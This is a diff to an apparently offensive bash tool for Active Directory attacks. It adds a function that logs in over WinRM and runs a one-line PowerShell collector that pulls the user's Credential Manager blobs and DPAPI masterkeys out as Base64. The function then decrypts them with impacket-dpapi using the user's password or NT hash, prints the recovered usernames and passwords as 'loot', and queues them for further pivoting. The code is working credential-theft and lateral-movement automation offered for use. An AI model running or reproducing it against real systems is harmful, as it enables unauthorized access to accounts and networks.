@@ -22,7 +22,7 @@ set -o pipefail
 # ===========================================================================
 #  METADATA
 # ===========================================================================
-readonly VERSION="1.55.1"
+readonly VERSION="1.55.2"
 readonly AUTHOR="c4sh3r"
 KERBRUTE_BIN="${KERBRUTE_BIN:-/opt/kerbrute}"
 KERBRUTE_RC4_DEAD=0               # set when the DC rejects RC4 (KDC_ERR_ETYPE_NOSUPP) → kerbrute unusable, spray via netexec
@@ -3148,6 +3148,118 @@ _winrm_service_creds() {
 _winrm_put() { _winrm_exec "upload \"$1\" \"$2\"" >>"$LOGFILE" 2>&1; }
 _winrm_get() { _winrm_exec "download \"$1\" \"$2\"" >>"$LOGFILE" 2>&1; }
 
+# Decrypt the CURRENT user's own Windows Credential Manager blobs without local
+# admin rights. `nxc smb --dpapi` needs administrative SMB access and `cmdkey
+# /list` can report NONE even when an Enterprise Credential blob exists. WinRM
+# already gives the user read access to their AppData, so transfer the small
+# Credential/Protect files as framed Base64 records, decrypt the referenced
+# masterkey with the credential we used to log on, then queue every recovered
+# account directly into the recursive pivot engine.
+_winrm_user_dpapi() {
+    have evil-winrm || return
+    have impacket-dpapi || { warn "impacket-dpapi unavailable → cannot decrypt user Credential Manager blobs"; return; }
+
+    subsection "User Credential Manager via WinRM (non-admin DPAPI)"
+    local safe root raw records ps sid="" extracted=0
+    safe=$(_safe_name "$USER")
+    root="$OUTDIR/dpapi_user_${safe}"
+    mkdir -p "$root/Credentials" "$root/Protect"
+
+    # The custom Evil-WinRM `download` command is unstable in some Ruby builds
+    # (malloc/Reline crashes). Standard PowerShell + Base64 is slower but reliable,
+    # works over Kerberos, and avoids writing anything to the target.
+    # _winrm_exec treats newlines as separate interactive commands, so keep the
+    # collector on ONE PowerShell line; otherwise foreach/script blocks are split
+    # before execution and only the SID marker is returned.
+    ps='$ErrorActionPreference="SilentlyContinue"; $sid=[Security.Principal.WindowsIdentity]::GetCurrent().User.Value; Write-Output ("ADPWN_DPAPI|SID|{0}" -f $sid); $sets=@([pscustomobject]@{Scope="ROAMING";Path="$env:APPDATA\Microsoft\Credentials"},[pscustomobject]@{Scope="LOCAL";Path="$env:LOCALAPPDATA\Microsoft\Credentials"}); foreach($s in $sets){ if(Test-Path $s.Path){ Get-ChildItem -Force -File $s.Path | Where-Object {$_.Length -lt 1048576} | ForEach-Object { try { $b=[Convert]::ToBase64String([IO.File]::ReadAllBytes($_.FullName)); Write-Output ("ADPWN_DPAPI|CRED|{0}|{1}|{2}" -f $s.Scope,$_.Name,$b) } catch {} } } }; $protect=Join-Path $env:APPDATA ("Microsoft\Protect\"+$sid); if(Test-Path $protect){ Get-ChildItem -Force -File $protect | Where-Object {$_.Name -match "^[0-9a-fA-F-]{36}$" -and $_.Length -lt 1048576} | ForEach-Object { try { $b=[Convert]::ToBase64String([IO.File]::ReadAllBytes($_.FullName)); Write-Output ("ADPWN_DPAPI|MK|ROAMING|{0}|{1}" -f $_.Name,$b) } catch {} } }'
+
+    raw=$(_winrm_exec "$ps" 2>/dev/null | sed -E 's/\x1b\[[0-9;?]*[a-zA-Z]//g' | tr -d '\r')
+    printf '%s\n' "$raw" >"$root/winrm_transport.txt"
+    records=$(printf '%s\n' "$raw" | grep -aoE 'ADPWN_DPAPI\|(SID\|S-1-[0-9-]+|(CRED|MK)\|[A-Z]+\|[A-Za-z0-9._{}-]+\|[A-Za-z0-9+/=]+)' \
+        | awk '!seen[$0]++')
+    if [[ -z "$records" ]]; then
+        info "No user DPAPI records returned over WinRM"
+        return
+    fi
+
+    local marker kind field1 field2 field3 dst
+    while IFS='|' read -r marker kind field1 field2 field3; do
+        [[ "$marker" == "ADPWN_DPAPI" ]] || continue
+        if [[ "$kind" == "SID" ]]; then
+            sid="$field1"
+            [[ "$sid" =~ ^S-1-5-21-([0-9]+-){3}[0-9]+$ ]] && mkdir -p "$root/Protect/$sid"
+            continue
+        fi
+        [[ "$kind" == "CRED" || "$kind" == "MK" ]] || continue
+        [[ "$field1" =~ ^[A-Z]+$ && "$field2" =~ ^[A-Za-z0-9._{}-]+$ && -n "$field3" ]] || continue
+        if [[ "$kind" == "CRED" ]]; then
+            dst="$root/Credentials/${field1}_${field2}"
+        else
+            [[ -n "$sid" ]] || continue
+            dst="$root/Protect/$sid/$field2"
+        fi
+        if printf '%s' "$field3" | base64 -d >"$dst" 2>/dev/null && [[ -s "$dst" ]]; then
+            extracted=$((extracted+1))
+        else
+            rm -f "$dst"
+        fi
+    done <<<"$records"
+
+    [[ "$extracted" -gt 0 ]] || { info "DPAPI markers were returned, but no blobs decoded cleanly"; return; }
+    loot "$extracted user DPAPI file(s) extracted over WinRM → $root"
+
+    if [[ -z "$PASS$HASH" ]]; then
+        info "DPAPI files collected, but this identity is ticket-only: a password/NT hash is required to derive its user masterkey"
+        return
+    fi
+
+    local -A mkeys=()
+    local blob guid mk mout key out u p got=0
+    while IFS= read -r blob; do
+        [[ -s "$blob" ]] || continue
+        guid=$(impacket-dpapi credential -file "$blob" 2>/dev/null | tr -d '\000' \
+            | grep -oiP 'Guid MasterKey\s*:\s*\K[0-9a-f-]{36}' | head -1)
+        guid="${guid,,}"
+        [[ -n "$guid" ]] || continue
+
+        key="${mkeys[$guid]:-}"
+        if [[ -z "$key" ]]; then
+            mk=$(find "$root/Protect" -type f -iname "$guid" -print -quit 2>/dev/null)
+            [[ -s "$mk" && -n "$sid" ]] || { warn "Credential $(basename "$blob") references unavailable masterkey $guid"; continue; }
+            if [[ -n "$PASS" ]]; then
+                mout=$(impacket-dpapi masterkey -file "$mk" -sid "$sid" -password "$PASS" 2>/dev/null | tr -d '\000')
+            else
+                mout=$(impacket-dpapi masterkey -file "$mk" -sid "$sid" -hashes ":${HASH##*:}" 2>/dev/null | tr -d '\000')
+            fi
+            key=$(printf '%s\n' "$mout" | grep -oiP 'Decrypted key:\s*0x\K[0-9a-f]+' | head -1)
+            [[ -n "$key" ]] || { warn "Could not decrypt user masterkey $guid with the current credential"; continue; }
+            mkeys["$guid"]="$key"
+            loot "★ User DPAPI masterkey $guid decrypted"
+        fi
+
+        out=$(impacket-dpapi credential -file "$blob" -key "0x$key" 2>/dev/null | tr -d '\000')
+        u=$(printf '%s\n' "$out" | sed -nE 's/^[[:space:]]*Username[[:space:]]*:[[:space:]]*//p' | head -1 \
+            | sed -E 's/^[[:space:]]+//;s/[[:space:]]+$//')
+        p=$(printf '%s\n' "$out" | sed -nE 's/^[[:space:]]*Password[[:space:]]*:[[:space:]]*//p' | head -1)
+        [[ -n "$p" ]] || p=$(printf '%s\n' "$out" | sed -nE 's/^[[:space:]]*Unknown[[:space:]]*:[[:space:]]*//p' | sed '/^[[:space:]]*$/d' | tail -1)
+        p=$(printf '%s' "$p" | sed -E 's/^[[:space:]]+//;s/[[:space:]]+$//')
+        [[ -n "$u" && -n "$p" ]] || continue
+        _plausible_secret "$p" || continue
+        printf '%s\n' "$out" >"$root/decrypted_$(basename "$blob").txt"
+        u="${u##*\\}"; u="${u##*/}"; u="${u%%@*}"
+        _is_valid_identity "$u" || continue
+        loot "★★ User Credential Manager secret recovered → ${C_GREEN}${u} : ${p}${C_RESET}"
+        add_secret "$p" "user DPAPI via WinRM ($(basename "$blob"))"
+        note_cred_source "${u}:${p}" "user Credential Manager DPAPI via WinRM"
+        queue_cred "$u" "$p" "" "user Credential Manager DPAPI via WinRM"
+        got=$((got+1))
+    done < <(find "$root/Credentials" -type f 2>/dev/null | sort)
+
+    [[ "$got" -gt 0 ]] && loot "$got Credential Manager credential(s) decrypted and queued" \
+                        || info "No Credential Manager blob could be decrypted with the current user credential"
+    return 0
+}
+
 # PE architecture of a downloaded binary → we must build the payload DLL to match (an
 # x64 DLL won't load into a 32-bit process and vice-versa).
 _pe_arch() {
@@ -3711,6 +3823,9 @@ phase_winrm_dpapi() {
             else
                 ok "Shell:  evil-winrm -i $DC_FQDN -u $USER $( [[ -n "$HASH" ]] && echo "-H $HASH" || echo "-p '<pass>'" )"
             fi
+            # Highest-value non-admin post-ex first: recover the current user's
+            # own saved Credential Manager entries and immediately queue them.
+            [[ "$confirmed" == "1" ]] && _winrm_user_dpapi
             analyze_privileges
             _winrm_postex
         else
